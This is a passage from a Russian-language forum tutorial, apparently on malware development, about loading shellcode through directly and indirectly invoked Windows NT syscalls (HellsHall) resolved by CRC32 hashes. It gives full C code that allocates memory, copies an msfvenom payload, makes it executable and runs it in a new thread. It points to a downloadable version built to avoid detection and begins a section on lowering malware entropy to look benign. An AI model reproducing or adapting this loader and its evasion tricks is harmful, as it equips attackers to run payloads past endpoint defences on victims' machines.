    NT_SYSCALL    NtCreateThreadEx;
    NT_SYSCALL    NtWaitForSingleObject;

} NTAPI_FUNC, *PNTAPI_FUNC;

// –≥–ª–æ–±–∞–ª—å–Ω–∞—è –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è
NTAPI_FUNC g_Nt = { 0 };</code></pre>
	</div>
</div><br />
<b>–°–æ–∑–¥–∞–Ω–∏–µ —Ñ—É–Ω–∫—Ü–∏–∏ InitializeNtSyscalls</b><br />
<br />
–î–ª—è –∑–∞–ø–æ–ª–Ω–µ–Ω–∏—è –≥–ª–æ–±–∞–ª—å–Ω–æ–π –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π g_Nt —Å–æ–∑–¥–∞–µ—Ç—Å—è –Ω–æ–≤–∞—è —Ñ—É–Ω–∫—Ü–∏—è InitializeNtSyscalls, –∫–æ—Ç–æ—Ä–∞—è –±—É–¥–µ—Ç –≤—ã–∑—ã–≤–∞—Ç—å FetchNtSyscall –¥–ª—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –≤—Å–µ—Ö —á–ª–µ–Ω–æ–≤ NTAPI_FUNC.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL InitializeNtSyscalls() {

    if (!FetchNtSyscall(NtAllocateVirtualMemory_CRC32, &amp;g_Nt.NtAllocateVirtualMemory)) {
        printf(&quot;[!] Failed In Obtaining The Syscall Number Of NtAllocateVirtualMemory \n&quot;);
        return FALSE;
    }
    printf(&quot;[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.2X \n&quot;, g_Nt.NtAllocateVirtualMemory.dwSSn);


    if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &amp;g_Nt.NtProtectVirtualMemory)) {
        printf(&quot;[!] Failed In Obtaining The Syscall Number Of NtProtectVirtualMemory \n&quot;);
        return FALSE;
    }
    printf(&quot;[+] Syscall Number Of NtProtectVirtualMemory Is : 0x%0.2X \n&quot;, g_Nt.NtProtectVirtualMemory.dwSSn);


    if (!FetchNtSyscall(NtCreateThreadEx_CRC32, &amp;g_Nt.NtCreateThreadEx)) {
        printf(&quot;[!] Failed In Obtaining The Syscall Number Of NtCreateThreadEx \n&quot;);
        return FALSE;
    }
    printf(&quot;[+] Syscall Number Of NtCreateThreadEx Is : 0x%0.2X \n&quot;, g_Nt.NtCreateThreadEx.dwSSn);


    if (!FetchNtSyscall(NtWaitForSingleObject_CRC32, &amp;g_Nt.NtWaitForSingleObject)) {
        printf(&quot;[!] Failed In Obtaining The Syscall Number Of NtWaitForSingleObject \n&quot;);
        return FALSE;
    }
    printf(&quot;[+] Syscall Number Of NtWaitForSingleObject Is : 0x%0.2X \n&quot;, g_Nt.NtWaitForSingleObject.dwSSn);

    return TRUE;
}</code></pre>
	</div>
</div><br />
NtAllocateVirtualMemory_CRC32, NtProtectVirtualMemory_CRC32, NtCreateThreadEx_CRC32 –∏ NtWaitForSingleObject_CRC32 - —ç—Ç–æ —Ö—ç—à-–∑–Ω–∞—á–µ–Ω–∏—è —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤.<br />
<br />
<b>–ü—Ä–æ–≥—Ä–∞–º–º–∞ Hasher</b><br />
<br />
–•—ç—à–∏ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ –≥–µ–Ω–µ—Ä–∏—Ä—É—é—Ç—Å—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º –ø—Ä–æ–≥—Ä–∞–º–º—ã Hasher, –∫–æ—Ç–æ—Ä–∞—è —Å–æ–¥–µ—Ä–∂–∏—Ç —Ñ—É–Ω–∫—Ü–∏—é —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è crc32h. Hasher –ø–µ—á–∞—Ç–∞–µ—Ç –∑–Ω–∞—á–µ–Ω–∏—è –≤—ã–≤–æ–¥–∞ —Ñ—É–Ω–∫—Ü–∏–∏ crc32h.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>#include &lt;Windows.h&gt;
#include &lt;stdio.h&gt;

#define SEED 0xEDB88320
#define STR &quot;_CRC32&quot;

unsigned int crc32h(char* message) {
    int i, crc;
    unsigned int byte, c;
    const unsigned int g0 = SEED, g1 = g0 &gt;&gt; 1,
        g2 = g0 &gt;&gt; 2, g3 = g0 &gt;&gt; 3, g4 = g0 &gt;&gt; 4, g5 = g0 &gt;&gt; 5,
        g6 = (g0 &gt;&gt; 6) ^ g0, g7 = ((g0 &gt;&gt; 6) ^ g0) &gt;&gt; 1;

    i = 0;
    crc = 0xFFFFFFFF;
    while ((byte = message[i]) != 0) {    // Get next byte.
        crc = crc ^ byte;
        c = ((crc &lt;&lt; 31 &gt;&gt; 31) &amp; g7) ^ ((crc &lt;&lt; 30 &gt;&gt; 31) &amp; g6) ^
            ((crc &lt;&lt; 29 &gt;&gt; 31) &amp; g5) ^ ((crc &lt;&lt; 28 &gt;&gt; 31) &amp; g4) ^
            ((crc &lt;&lt; 27 &gt;&gt; 31) &amp; g3) ^ ((crc &lt;&lt; 26 &gt;&gt; 31) &amp; g2) ^
            ((crc &lt;&lt; 25 &gt;&gt; 31) &amp; g1) ^ ((crc &lt;&lt; 24 &gt;&gt; 31) &amp; g0);
        crc = ((unsigned)crc &gt;&gt; 8) ^ c;
        i = i + 1;
    }
    return ~crc;
}

#define HASH(API) crc32h((char*)API)

int main() {
    printf(&quot;#define %s%s \t 0x%0.8X \n&quot;, &quot;NtAllocateVirtualMemory&quot;, STR, HASH(&quot;NtAllocateVirtualMemory&quot;));
    printf(&quot;#define %s%s \t 0x%0.8X \n&quot;, &quot;NtProtectVirtualMemory&quot;, STR, HASH(&quot;NtProtectVirtualMemory&quot;));
    printf(&quot;#define %s%s \t 0x%0.8X \n&quot;, &quot;NtCreateThreadEx&quot;, STR, HASH(&quot;NtCreateThreadEx&quot;));
    printf(&quot;#define %s%s \t 0x%0.8X \n&quot;, &quot;NtWaitForSingleObject&quot;, STR, HASH(&quot;NtWaitForSingleObject&quot;));
}</code></pre>
	</div>
</div><br />
<div class="bbImageWrapper  js-lbImage" title="1746787788606.png"
		data-src="https://osint42.org/attachments/1746787788606-png.258/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787788606-png.258/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787788606.png"
			title="1746787788606.png"
			width="1256" height="99" loading="lazy" />
	</div><br />
<br />
<b>–ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è</b><br />
<br />
–°–Ω–∞—á–∞–ª–∞ –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏—è InitializeNtSyscalls, –∞ –∑–∞—Ç–µ–º –≤—ã–∑—ã–≤–∞—é—Ç—Å—è —Å–∏—Å—Ç–µ–º–Ω—ã–µ –≤—ã–∑–æ–≤—ã –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ª–æ–∫–∞–ª—å–Ω–æ–π –∏–Ω—ä–µ–∫—Ü–∏–∏ –∫–æ–¥–∞ —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º shellcode –∏–∑ Msfvenom. –í—ã–∑–æ–≤ —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º —Å–±–æ—Ä–æ—á–Ω—ã—Ö —Ñ—É–Ω–∫—Ü–∏–π SetSSn –∏ RunSyscall, –æ–ø–∏—Å–∞–Ω–Ω—ã—Ö —Ä–∞–Ω–µ–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int main() {

    NTSTATUS    STATUS      = NULL;
    PVOID       pAddress    = NULL;
    SIZE_T      sSize       = sizeof(Payload);
    DWORD       dwOld       = NULL;
    HANDLE      hProcess    = (HANDLE)-1,   // –ª–æ–∫–∞–ª—å–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å
                hThread     = NULL;

    // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∏—Å–ø–æ–ª—å–∑—É–µ–º—ã—Ö —Å–∏—Å—Ç–µ–º–Ω—ã—Ö –≤—ã–∑–æ–≤–æ–≤
    if (!InitializeNtSyscalls()) {
        printf(&quot;[!] Failed To Initialize The Specified Direct-Syscalls \n&quot;);
        return -1;
    }

    // –í—ã–¥–µ–ª–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏
    SetSSn(g_Nt.NtAllocateVirtualMemory.dwSSn);
    if ((STATUS = RunSyscall(hProcess, &amp;pAddress, 0, &amp;sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x00 || pAddress == NULL) {
        printf(&quot;[!] NtAllocateVirtualMemory Failed With Error: 0x%0.8X \n&quot;, STATUS);
        return -1;
    }

    // –ö–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏
    memcpy(pAddress, Payload, sizeof(Payload));
    sSize = sizeof(Payload);

    // –ò–∑–º–µ–Ω–µ–Ω–∏–µ –∑–∞—â–∏—Ç—ã –ø–∞–º—è—Ç–∏
    SetSSn(g_Nt.NtProtectVirtualMemory.dwSSn);
    if ((STATUS = RunSyscall(hProcess, &amp;pAddress, &amp;sSize, PAGE_EXECUTE_READ, &amp;dwOld)) != 0x00) {
        printf(&quot;[!] NtProtectVirtualMemory Failed With Error: 0x%0.8X \n&quot;, STATUS);
        return -1;
    }

    // –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏
    SetSSn(g_Nt.NtCreateThreadEx.dwSSn);
    if ((STATUS = RunSyscall(&amp;hThread, THREAD_ALL_ACCESS, NULL, hProcess, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x00) {
        printf(&quot;[!] NtCreateThreadEx Failed With Error: 0x%0.8X \n&quot;, STATUS);
        return -1;
    }

    // –û–∂–∏–¥–∞–Ω–∏–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–∏
    SetSSn(g_Nt.NtWaitForSingleObject.dwSSn);
    if ((STATUS = RunSyscall(hThread, FALSE, NULL)) != 0x00) {
        printf(&quot;[!] NtWaitForSingleObject Failed With Error: 0x%0.8X \n&quot;, STATUS);
        return -1;
    }

    printf(&quot;[#] Press &lt;Enter&gt; To Quit ... &quot;);
    getchar();

    return 0;
}</code></pre>
	</div>
</div><br />
–ï—â—ë –±–æ–ª–µ–µ —É–ª—É—á—à–µ–Ω–Ω—É—é  –≤–µ—Ä—Å–∏—é –º–æ–∂–Ω–æ —Å–∫–∞—á–∞—Ç—å –∑–¥–µ—Å—å:<a href="https://github.com/Maldev-Academy/HellHall" target="_blank" class="link link--external" rel="noopener">GitHub - Maldev-Academy/HellHall: Performing Indirect Clean Syscalls</a><br />
<br />
–ò–ª–∏ —Å –Ω–∞—à–µ–≥–æ —Ä–µ—Å—É—Ä—Å–∞:https://osint42.org/attachments/hellshall-clang-nocrt-zip.260/<br />
<br />
–í —ç—Ç–æ–π –≤–µ—Ä—Å–∏–∏ —É–±—Ä–∞–Ω–∞ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—è syscall, –ø–æ –Ω–∞–ª–∏—á–∏—é –∫–æ—Ç–æ—Ä–æ–π –≤ –∫–æ–¥–µ –º–æ–∂–µ—Ç-–±—ã—Ç—å –¥–µ—Ç–µ–∫—Ç.)<br />
<br />
<b>–ö–∞–∫ —ç—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç</b><br />
<br />
HellsHall –±—É–¥–µ—Ç –∏—Å–∫–∞—Ç—å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –æ–∫–æ–ª–æ –∞–¥—Ä–µ—Å–∞ —Ñ—É–Ω–∫—Ü–∏–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –∞ –∑–∞—Ç–µ–º —Å–æ—Ö—Ä–∞–Ω–∏—Ç —ç—Ç–æ—Ç –∞–¥—Ä–µ—Å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –≤ –≥–ª–æ–±–∞–ª—å–Ω—É—é –ø–µ—Ä–µ–º–µ–Ω–Ω—É—é, –∫ –∫–æ—Ç–æ—Ä–æ–π –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω –ø–µ—Ä–µ—Ö–æ–¥ –ø–æ–∑–¥–Ω–µ–µ,<b> –∞ –Ω–µ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —ç—Ç–æ–π –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ –Ω–∞–ø—Ä—è–º—É—é –∏–∑ asm-—Ñ–∞–π–ª–∞. </b><br />
<br />
–≠—Ç–æ –ø—Ä–∏–≤–µ–¥–µ—Ç –∫ —Ç–æ–º—É, —á—Ç–æ —Ñ—É–Ω–∫—Ü–∏—è —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –±—É–¥–µ—Ç –≤—ã–ø–æ–ª–Ω–µ–Ω–∞ –∏–∑ –∞–¥—Ä–µ—Å–Ω–æ–≥–æ –ø—Ä–æ—Å—Ç—Ä–∞–Ω—Å—Ç–≤–∞ ntdll.dll.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746787823532.png"
		data-src="https://osint42.org/attachments/1746787823532-png.259/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746787823532-png.259/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746787823532.png"
			title="1746787823532.png"
			width="1283" height="513" loading="lazy" />
	</div><br />
<br />
–ü—Ä–∏–º–µ—Ä –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è, –≤ –≥–ª–∞–≤–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ (<a href="https://github.com/Maldev-Academy/HellHall/blob/main/Hell%27sHall/Hell%27sHall/main.c" target="_blank" class="link link--external" rel="noopener">HellHall/Hell&#039;sHall/Hell&#039;sHall/main.c at main ¬∑ Maldev-Academy/HellHall</a>):<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>int main() {

    printf(&quot;[i] [HELL HALL] Press &lt;Enter&gt; To Run ... &quot;);
    getchar();
 

    if (!Initialize())
        return -1;

    PVOID        pAddress    = NULL;
    SIZE_T        dwSize        = sizeof(rawData);
    DWORD        dwOld        = NULL;
    HANDLE        hThread        = NULL;
    NTSTATUS    STATUS        = NULL;


    SYSCALL(S.NtAllocateVirtualMemory);
    if ((STATUS = HellHall((HANDLE)-1, &amp;pAddress, 0, &amp;dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x0) {
        printf(&quot;[!] NtAllocateVirtualMemory Failed With Status : 0x%0.8X\n&quot;, STATUS);
        return -1;
    }
 
    printf(&quot;[+] [HELL HALL] pAddress : 0x%p \n&quot;, pAddress);


    memcpy(pAddress, rawData, sizeof(rawData));


    SYSCALL(S.NtProtectVirtualMemory);
    if ((STATUS = HellHall((HANDLE)-1, &amp;pAddress, &amp;dwSize, PAGE_EXECUTE_READ, &amp;dwOld)) != 0x0) {
        printf(&quot;[!] NtProtectVirtualMemory Failed With Status : 0x%0.8X\n&quot;, STATUS);
        return -1;
    }

    SYSCALL(S.NtCreateThreadEx);
    if ((STATUS = HellHall(&amp;hThread, 0x1FFFFF, NULL, (HANDLE)-1, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x0) {
        printf(&quot;[!] NtCreateThreadEx Failed With Status : 0x%0.8X\n&quot;, STATUS);
        return -1;
    }


    printf(&quot;[#] [HELL HALL] Press &lt;Enter&gt; To QUIT ... \n&quot;);
    getchar();
    return 0;
}</code></pre>
	</div>
</div><br />
<b>–í —Ü–µ–ª–æ–º –∞–ª–≥–æ—Ä–∏—Ç–º –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –ø–æ—á—Ç–∏ —Ç–∞–∫–æ–π-–∂–µ –∫–∞–∫ –æ–ø–∏—Å–∞–Ω–Ω—ã–π –≤—ã—à–µ, –Ω–æ —Å–ª–µ–¥—É—é—â–∏–µ –æ—Ç–ª–∏—á–∏—è:<br />
<br />
1)–ê–ª–≥–æ—Ä–∏—Ç–º —Ö–µ—à–∏—Ä–æ–≤–∞–Ω–∏—è crc32b.<br />
<b>3)–í–º–µ—Å—Ç–æ —Ñ—É–Ω–∫—Ü–∏–∏ SetSSn –º–∞–∫—Ä–æ—Å SYSCALL (–í—ã–∑–æ–≤ –Ω–µ–º–Ω–æ–≥–æ –¥—Ä—É–≥–æ–π, –Ω–æ –ø–æ –∫–æ–¥—É –≥–ª–∞–≤–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –¥—É–º–∞—é –ø–æ–Ω—è—Ç–Ω–æ –∫–∞–∫ )</b><br />
2)–í–º–µ—Å—Ç–æ —Ñ—É–Ω–∫—Ü–∏–∏ RunSyscall —Ñ—É–Ω–∫—Ü–∏—è HellHall</b></div>
						

							<h2>–£–º–µ–Ω—å—à–µ–Ω–∏–µ –≤–µ—Ä–æ—è—Ç–Ω–æ—Å—Ç–∏ –¥–µ—Ç–µ–∫—Ç–∞ –∑–≤–µ—Ä—å–∫–∞</h2>

							

							

							<div class="bbWrapper"><b>–í–≤–µ–¥–µ–Ω–∏–µ</b><br />
<br />
–≠–Ω—Ç—Ä–æ–ø–∏—è –æ—Ç–Ω–æ—Å–∏—Ç—Å—è –∫ —Å—Ç–µ–ø–µ–Ω–∏ —Å–ª—É—á–∞–π–Ω–æ—Å—Ç–∏ –≤ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω–Ω–æ–º –Ω–∞–±–æ—Ä–µ –¥–∞–Ω–Ω—ã—Ö. –°—É—â–µ—Å—Ç–≤—É–µ—Ç —Ä–∞–∑–ª–∏—á–Ω—ã–µ —Ç–∏–ø—ã –º–µ—Ä —ç–Ω—Ç—Ä–æ–ø–∏–∏, —Ç–∞–∫–∏–µ –∫–∞–∫ —ç–Ω—Ç—Ä–æ–ø–∏—è –ì–∏–±–±—Å–∞, —ç–Ω—Ç—Ä–æ–ø–∏—è –ë–æ–ª—å—Ü–º–∞–Ω–∞ –∏ —ç–Ω—Ç—Ä–æ–ø–∏—è –†–µ–Ω—å–∏. –û–¥–Ω–∞–∫–æ –≤ –∫–æ–Ω—Ç–µ–∫—Å—Ç–µ –∫–∏–±–µ—Ä–±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ —Ç–µ—Ä–º–∏–Ω &quot;—ç–Ω—Ç—Ä–æ–ø–∏—è&quot; –æ–±—ã—á–Ω–æ –æ—Ç–Ω–æ—Å–∏—Ç—Å—è –∫ –≠–Ω—Ç—Ä–æ–ø–∏–∏ –®–µ–Ω–Ω–æ–Ω–∞, –∫–æ—Ç–æ—Ä–∞—è –≤—ã–¥–∞–µ—Ç –∑–Ω–∞—á–µ–Ω–∏–µ –æ—Ç 0 –¥–æ 8. –° —É–≤–µ–ª–∏—á–µ–Ω–∏–µ–º —É—Ä–æ–≤–Ω—è —Å–ª—É—á–∞–π–Ω–æ—Å—Ç–∏ –≤ –Ω–∞–±–æ—Ä–µ –¥–∞–Ω–Ω—ã—Ö —É–≤–µ–ª–∏—á–∏–≤–∞–µ—Ç—Å—è –∏ –∑–Ω–∞—á–µ–Ω–∏–µ —ç–Ω—Ç—Ä–æ–ø–∏–∏.<br />
<br />
–ë–∏–Ω–∞—Ä–Ω—ã–µ —Ñ–∞–π–ª—ã –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º –æ–±—ã—á–Ω–æ –∏–º–µ—é—Ç –±–æ–ª–µ–µ –≤—ã—Å–æ–∫–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ —ç–Ω—Ç—Ä–æ–ø–∏–∏ –ø–æ —Å—Ä–∞–≤–Ω–µ–Ω–∏—é —Å –æ–±—ã—á–Ω—ã–º–∏ —Ñ–∞–π–ª–∞–º–∏. <b>–í—ã—Å–æ–∫–∞—è —ç–Ω—Ç—Ä–æ–ø–∏—è, –∫–∞–∫ –ø—Ä–∞–≤–∏–ª–æ, —è–≤–ª—è–µ—Ç—Å—è –∏–Ω–¥–∏–∫–∞—Ç–æ—Ä–æ–º —Å–∂–∞—Ç—ã—Ö, –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã—Ö –∏–ª–∏ —É–ø–∞–∫–æ–≤–∞–Ω–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö</b>, –∫–æ—Ç–æ—Ä—ã–µ —á–∞—Å—Ç–æ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–º–∏ –ø—Ä–æ–≥—Ä–∞–º–º–∞–º–∏ –¥–ª—è —Å–∫—Ä—ã—Ç–∏—è –Ω–∞–≥—Ä—É–∑–∫–∏. –°–∂–∞—Ç—ã–µ, –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–µ –∏–ª–∏ —É–ø–∞–∫–æ–≤–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ —á–∞—Å—Ç–æ –≥–µ–Ω–µ—Ä–∏—Ä—É—é—Ç –±–æ–ª—å—à–æ–µ –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ —Å–ª—É—á–∞–π–Ω–æ–≥–æ –≤—ã–≤–æ–¥–∞, —á—Ç–æ –æ–±—ä—è—Å–Ω—è–µ—Ç, –ø–æ—á–µ–º—É —ç–Ω—Ç—Ä–æ–ø–∏—è –≤—ã—à–µ –≤ —Ñ–∞–π–ª–∞—Ö —Å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–º–∏ –ø—Ä–æ–≥—Ä–∞–º–º–∞–º–∏.<br />
<br />
–ù–∞ —Ä–∏—Å—É–Ω–∫–µ –Ω–∏–∂–µ —Å—Ä–∞–≤–Ω–∏–≤–∞–µ—Ç—Å—è —ç–Ω—Ç—Ä–æ–ø–∏—è –ª–µ–≥–∏—Ç–∏–º–Ω–æ–≥–æ –ø—Ä–æ–≥—Ä–∞–º–º–Ω–æ–≥–æ –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è –∏ –æ–±—Ä–∞–∑—Ü–æ–≤ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º. –û–±—Ä–∞—Ç–∏—Ç–µ –≤–Ω–∏–º–∞–Ω–∏–µ, –∫–∞–∫ —É –±–æ–ª—å—à–∏–Ω—Å—Ç–≤–∞ —Ñ–∞–π–ª–æ–≤ —Å –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–º–∏ –ø—Ä–æ–≥—Ä–∞–º–º–∞–º–∏ –∑–Ω–∞—á–µ–Ω–∏–µ —ç–Ω—Ç—Ä–æ–ø–∏–∏ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ –¥–∏–∞–ø–∞–∑–æ–Ω–µ –æ—Ç 7,2 –¥–æ 8, –≤ —Ç–æ –≤—Ä–µ–º—è –∫–∞–∫ –±–µ–∑–≤—Ä–µ–¥–Ω—ã–µ —Ñ–∞–π–ª—ã –≤ –æ—Å–Ω–æ–≤–Ω–æ–º –Ω–∞—Ö–æ–¥—è—Ç—Å—è –≤ –¥–∏–∞–ø–∞–∑–æ–Ω–µ –æ—Ç 5,6 –¥–æ 6,8. –ò–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ –≤–∑—è—Ç–æ –∏–∑ —Å—Ç–∞—Ç—å–∏ <a href="https://practicalsecurityanalytics.com/file-entropy/" target="_blank" class="link link--external" rel="noopener">Threat Hunting with File Entropy</a>, –∫–æ—Ç–æ—Ä–∞—è –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç, –∫–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —ç–Ω—Ç—Ä–æ–ø–∏—é —Ñ–∞–π–ª–∞ –¥–ª—è –ø–æ–∏—Å–∫–∞ —É–≥—Ä–æ–∑.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746788421956.png"
		data-src="https://osint42.org/attachments/1746788421956-png.272/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746788421956-png.272/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746788421956.png"
			title="1746788421956.png"
			width="856" height="709" loading="lazy" />
	</div><br />
<br />
–° —ç—Ç–∏–º —Å–∫–∞–∑–∞–Ω–Ω—ã–º, —Ü–µ–ª—å—é –¥–∞–Ω–Ω–æ–≥–æ —Ä–∞–∑–¥–µ–ª–∞ —è–≤–ª—è–µ—Ç—Å—è —É–º–µ–Ω—å—à–µ–Ω–∏–µ —ç–Ω—Ç—Ä–æ–ø–∏–∏ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ –∏ —Ä–∞–∑–º–µ—â–µ–Ω–∏–µ –µ–≥–æ –≤ –ø—Ä–∏–µ–º–ª–µ–º–æ–º –¥–∏–∞–ø–∞–∑–æ–Ω–µ, –ø–æ–¥–æ–±–Ω–æ–º –±–µ–∑–≤—Ä–µ–¥–Ω–æ–º—É —Ñ–∞–π–ª—É.<br />
<br />
<b>–ò–∑–º–µ—Ä–µ–Ω–∏–µ —ç–Ω—Ç—Ä–æ–ø–∏–∏ —Ñ–∞–π–ª–∞</b><br />
<br />
–î–ª—è –ø–æ–Ω–∏–º–∞–Ω–∏—è —Ç–æ–≥–æ, –∫–∞–∫ —É–º–µ–Ω—å—à–∏—Ç—å —ç–Ω—Ç—Ä–æ–ø–∏—é —Ñ–∞–π–ª–∞, –≤–∞–∂–Ω–æ —Å–Ω–∞—á–∞–ª–∞ –ø–æ–Ω—è—Ç—å, –∫–∞–∫ –µ–µ –≤—ã—á–∏—Å–ª–∏—Ç—å. –°—É—â–µ—Å—Ç–≤—É–µ—Ç –Ω–µ—Å–∫–æ–ª—å–∫–æ –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç–æ–≤, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–≥—É—Ç –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å —ç–Ω—Ç—Ä–æ–ø–∏—é –¥–∞–Ω–Ω–æ–≥–æ —Ñ–∞–π–ª–∞, —Ç–∞–∫–∏—Ö –∫–∞–∫ <a href="https://www.winitor.com/download" target="_blank" class="link link--external" rel="noopener">pestudio </a>–∏ <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sigcheck" target="_blank" class="link link--external" rel="noopener">Sigcheck</a>.<br />
<br />
